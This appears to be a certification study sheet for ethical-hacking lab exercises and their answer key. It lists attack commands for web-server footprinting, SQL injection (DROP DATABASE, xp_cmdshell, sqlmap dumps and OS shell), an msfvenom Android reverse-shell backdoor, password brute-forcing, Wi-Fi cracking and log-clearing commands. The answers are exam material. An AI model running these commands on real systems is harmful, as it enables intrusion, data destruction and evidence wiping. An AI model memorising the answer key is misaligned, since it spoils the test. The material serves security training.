            Perform web server reconnaissance using Skipfish
                        -> skipfish -o /home/attacker/test -S /usr/share/skipfish/dictionaries/complete.wl http://10.10.1.22:8080

            Footprint a web server using the httprecon Tool
            Footprint a web server using Netcat and Telnet
            Enumerate web server information using Nmap Scripting Engine (NSE)
                        -> nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap- www.goodshopping.com
                        -> nmap --script http-trace -d www.goodshopping.com
                        -> nmap -p80 --script http-waf-detect www.goodshopping.com

            Uniscan web server fingerprinting in Parrot Security
                        -> uniscan -u http://10.10.1.22:8080/CEH -we
                        -> uniscan -u http://10.10.1.22:8080/CEH -q
                        -> uniscan -u http://10.10.1.22:8080/CEH -d                 

Perform a web server attack
            Crack FTP credentials using a Dictionary Attack

```

# Lab 13 - Hacking Web Applications 
```
Footprint the web infrastructure
            Perform web application reconnaissance using Nmap and Telnet
            Perform web application reconnaissance using WhatWeb
            Perform web spidering using OWASP ZAP
            Detect load balancers using various tools
            Identify web server directories using various tools
                        -> nmap -sV --script=http-enum [target domain or IP address]

            Perform web application vulnerability scanning using Vega
            Identify clickjacking vulnerability using ClickjackPoc
                        -> “http://www.moviescope.com” | tee domain.txt
                        -> python3 clickJackPoc.py -f domain.txt

Perform web application attacks
            Perform a brute-force attack using Burp Suite
            Perform parameter tampering using Burp Suite
            Identify XSS vulnerabilities in web applications using PwnXSS
            Exploit parameter tampering and XSS vulnerabilities in web applications
            Perform cross-site request forgery (CSRF) attack
            Enumerate and hack a web application using WPScan and Metasploit
                        -> set PASS_FILE /home/attacker/Desktop/CEHv12 Module 14 Hacking Web Applications/Wordlist/password.txt
                        -> set RHOSTS 10.10.1.22
                        -> set RPORT 8080 
                        -> set TARGETURI http//10.10.1.22:8080/CEH
                        -> set USERNAME admin
                        -> run

            Exploit a remote command execution vulnerability to compromise a target web server
            Exploit a file upload vulnerability at different security levels
            Gain access by exploiting Log4j vulnerability

```

# Lab 14 - SQL Injection
```

Perform SQL injection attacks

            Perform an SQL injection attack on an MSSQL database
                        -> blah' or 1=1 --
                        -> blah';insert into login values ('john','apple123'); --
                        -> blah';create database mydatabase; --
                        -> blah'; DROP DATABASE mydatabase; --
                        -> blah'; DROP TABLE table_name; --
                        -> blah';exec master..xp_cmdshell 'ping www.certifiedhacker.com -l 65000 -t'; --

            Perform an SQL injection attack against MSSQL to extract databases using sqlmap
                        ->  sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jWydNf8wro=; ui-tabs-1=0" --dbs
                        -> sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jWydNf8wro=; ui-tabs-1=0" -D moviescope --tables
                        -> sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jWydNf8wro=; ui-tabs-1=0" -D moviescope -T User_Login --dump
                        -> sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jWydNf8wro=; ui-tabs-1=0" --os-shell
                        -> hostname

Detect SQL injection vulnerabilities using various SQL injection detection tools

            Detect SQL injection vulnerabilities using DSSS
                        -> python3 dsss.py -u "http://www.moviescope.com/viewprofile.aspx?id=1"  --cookie="mscope=1jWydNf8wro=; ui-tabs-1=0"
                        ->

            Detect SQL injection vulnerabilities using OWASP ZAP

```


# Lab 15 - Hacking Wireless Networks
```
Perform wireless traffic analysis
            Wi-Fi packet analysis using Wireshark

Perform wireless attacks
            Crack a WEP network using Aircrack-ng
                        ->  aircrack-ng '/home/attacker/Desktop/Sample Captures/WEPcrack-01.cap'

            Crack a WPA2 network using Aircrack-ng
                        -> aircrack-ng -a2 -b [Target BSSID] -w /home/attacker/Desktop/Wordlist/password.txt '/home/attacker/Desktop/Sample Captures/WPA2crack-01.cap'


Overview of Wireless Attacks

            Fragmentation attack: When successful, such attacks can obtain 1,500 bytes of PRGA (pseudo random generation algorithm)
            
            MAC spoofing attack: The attacker changes their MAC address to that of an authenticated user in order to bypass the access point’s MAC-filtering configuration
            
            Disassociation attack: The attacker makes the victim unavailable to other wireless devices by destroying the connectivity between the access point and client
            
            Deauthentication attack: The attacker floods station(s) with forged deauthentication packets to disconnect users from an access point
            
            Man-in-the-middle attack: An active Internet attack in which the attacker attempts to intercept, read, or alter information between two computers
            
            Wireless ARP poisoning attack: An attack technique that exploits the lack of a verification mechanism in the ARP protocol by corrupting the ARP cache maintained by the OS in order to associate the attacker’s MAC address with the target host
            
            Rogue access points: Wireless access points that an attacker installs on a network without authorization and that are not under the management of the network administrator
            
            Evil twin: A fraudulent wireless access point that pretends to be a legitimate access point by imitating another network name
            
            Wi-Jacking attack: A method used by attackers to gain access to an enormous number of wireless networks

```

# Lab 17 - Hacking Mobile Platforms
```
Hack android devices

            Hack an Android device by creating binary payloads using Parrot Security
                        -> service postgresql start
                        -> msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R > Desktop/Backdoor.apk
                        

            Harvest users’ credentials using the Social-Engineer Toolkit
            Launch a DoS attack on a target machine using Low Orbit Ion Cannon (LOIC) on the Android mobile platform
            Exploit the Android platform through ADB using PhoneSploit
            Hack an Android device by creating APK file using AndroRAT

Secure Android Devices using Various Android Security Tools

            Analyze a malicious app using online Android analyzers
            Secure Android devices from malicious apps using Malwarebytes Security
```


# Lab 18 - Cloud Computing
```
Perform S3 bucket enumeration using various S3 bucket enumeration tools

            Enumerate S3 buckets using lazys3
            Enumerate S3 buckets using S3Scanner

Exploit S3 buckets

            Exploit open S3 buckets using AWS CLI
            
Perform privilege escalation to gain higher privileges

            Escalate IAM user privileges by exploiting misconfigured user policy
```

# Lab 19 - Cryptography 
```
Encrypt the information using various cryptography tools

            Calculate one-way hashes using HashCalc

                        Use HashCalc to find the CRC32 hash value of the file E:\CEH-Tools\CEHv12 Module 20 Cryptography\MD5 and MD6 Hash Calculators\HashCalc\setup.exe
                        -> hashcalc.exe
                        -> format: file
                        -> data: path of file (E:\CEH-Tools\CEHv12 Module 20 Cryptography\MD5 and MD6 Hash Calculators\HashCalc\setup.exe)
                        -> calculate

            Calculate MD5 hashes using MD5 Calculator

                        Use md5calculator to find the MD5 hash value of the file E:\CEH-Tools\CEHv12 Module 20 Cryptography\MD5 and MD6 Hash Calculators\MD5 Calculator\md5calc(1.0.0.0).msi
                        -> md5calculator.exe
                        -> Add Files
                        -> Calculate
                        -> 9434B8108CDECAB051867717CC58DBDF

            Calculate MD5 hashes using HashMyFiles

                        Use HashMyFiles to find the MD5 hash value of the file E:\CEH-Tools\CEHv12 Module 20 Cryptography\MD5 and MD6 Hash Calculators\HashMyFiles\Sample Files\Medical Records.docx
                        -> HashMyFiles.exe
                        -> File > Add Folder
                        -> a70797abcd22d04fdd0216d58a4cfebb

            Perform file and text message encryption using CryptoForge
            Encrypt and decrypt data using BCTextEncoder
                        -> BCTextEncoder.exe

                        -> Encrypt
                        -> Enter you password
                        -> Encode
                        -> Set a password and Confirm

                        -> Decrypt
                        -> Encoded Text
                        -> Decode
                        -> Enter passowrd

Create a self-signed certificate
            Create and use self-signed certificates

Perform email encryption
            Perform email encryption using RMail

Perform disk encryption
            Perform disk encryption using VeraCrypt
                        -> VeraCrypt.exe
                        -> Create Volume
                        -> Create an encrypted file container
                        -> Select local File
                        -> Name file (MyVolume)
                        -> Volume Size (5 MB)
                        -> Volume Password (qwerty@123)
                        -> Format
                        -> Select Drive (Ex: J)
                        -> Mount
                        -> Select File (MyVolume)
                        -> Enter Password (qwerty@123)
                        -> Mount the volume in J: drive
                        -> Create a file secret.txt
                        -> Copy a secret.txt to J: Drive
                        -> Enter password
                        

            Perform disk encryption using BitLocker Drive Encryption
            Perform disk encryption using Rohos Disk Encryption

                        Rohos Disk Encryption creates hidden and password-protected partitions on a computer or USB flash drive, and password protects/locks access to your Internet applications

                        Perform disk encryption using Rohos. Which encryption algorithm is used in Rohos?
                        -> AES256

Perform cryptanalysis using various cryptanalysis tools
            Perform cryptanalysis using CrypTool

                        Encrypt
                                    -> File > New
                                    -> Enter with text (Password123)
                                    -> Encrypt/Decrypt > Symmetric Modern > RC2 > Key Length (16 bits) > 10 20
                                    -> Encrypt
                                    -> File > Save > Cry-RC2-Unnamed.txt
                        
                        Decrypt
                                    -> CyptTool.exe
                                    -> File > Open > Cry-RC2-Unnamed.txt
                                    -> Encrypt/Decrypt > Symmetric Modern > RC2 > Key Length (16 bits) > 10 20
                                    -> Decrypt
            
            Perform cryptanalysis using AlphaPeeler
```

# Answers
```

LAB 3

Name shared folder - WINDOWS11 <20>
NetBios enumerator - CEH
snmp-check - Server2022.CEH.com
snmp-check - CEH
snmp-check - 6
SoftPerfect Network Scanner - ubuntu-Virtual-Machine.local
SoftPerfect Network Scanner - Android.local
SoftPerfect Network Scanner - SERVER2022
SnmpWalk - -c
Nmap snmp - -sU
Nmap snmp - -p
Ldap enum - 10.10.1.22
Ldap enum - jason@CEH.com
python ldap3 - 389
python ldap3 - server.info
ldapsearch - -x
ldapsearch - -b
NFS - 2049
DNS Transferzone - no
DNS Transferzone - dnsadmin.box5331.bluehost.com
DNSSEC Zone Walking - 162.159.25.175
DNS Enumeration using Nmap - box5331.bluehost.com
SMTP Enumeration using Nmap - 10
SMB and RPC Enumeration using NetScanTools Pro - no
FTP Enumeration using Nmap - Microsoft-IIS/10.0
Global Network Inventory - Microsoft Windows Server 2022 Standard
Advanced IP Scanner - 2.4.52
Samba Hosts using Enum4linux  - 0x451
Samba Hosts using Enum4linux  -  500
Samba Hosts using Enum4linux - 0x84102f


-------------------------------------

LAB 4


Sensitive Data Storage in Improperly locked memory
Improper Restriction of Operations within the bounds of a memory buffer
Windows SMB Information Disclosure Vulnerability
CWE-79
7.5
7.0-8.9
7.0-10.0
8834
41028
c2hhcmVkLmJsdWVob3N0LmNvbQ==


-------------------------------------

LAB 5 - System Hacking

-I
apple
2018-6892
22000
########
cmd
2
showmount -e 10.10.1.9
ps -ef	
WORKGROUP
load kiwi
Ctrl+Alt+X 
Complete + Stealth Configuration
getsystem -t 1
Martin
auditpol /clear /y
wevtutil cl system
export HISTSIZE=0
Test
Secret.txt

------------- 

LAB - Android

localhost
80
80
images.jpeg
########
getSMS inbox

______________

LAB - SQL Injection

blah';insert into login values ('Martin','qwerty123'); --
blah';create database MySQLDatabase; --
password
blind SQL injection
89
19
______________

LAB - Social Engenineering

Custom Import
Suspected Phishing
Is a phishg

________________

LAB - Hacking Web Aplication

10.10.1.19
Server2019
ASP_NET 4.0.3
EC-Council
4.0.30319
Spider
YES
########
7
-e
-x
8080
YES
-f
admin/qwerty@123
john
20-05-1983
http://testphp.vulnweb.com
-u
steve
3
2.5.0
admin
Server2022
8
SERVER2022


---------------------------------

LAB - Session Hijacking

break
ARP
 net.sniff on

---------------------------------

LAB - Cloud Computing

25320

---------------------------------

LAB 9 - Denial of Service

auxiliary/dos/tcp/synflood
-a
l4
l7
FIRE TEH LAZER!
9001
Block IP(B)


----------------------------------

LAB 15 - Wireless

802.11

___________

Lab 12 - Hacking Web Servers

NS1.BLUEHOST.COM
YES
80
Microsoft-IIS/10.0
3389
yes
PHP
admin@wampserver.invalid
apple
Jason


______________________

LAB Sniffing
54
68
42
Sniffer
-s
-a
Warning
nmap --script=sniffer-detect


______________________

LAB Evading IDS, Firewall

snort -W
Zone: Blocked
Port Mapping
4000


```

![image](https://github.com/user-attachments/assets/76899df8-b89d-4564-8e78-d4e0f552de24)

![2022-04-05_18-08-01](https://github.com/user-attachments/assets/f79743e6-f4d9-4e25-90ad-955322524d44)
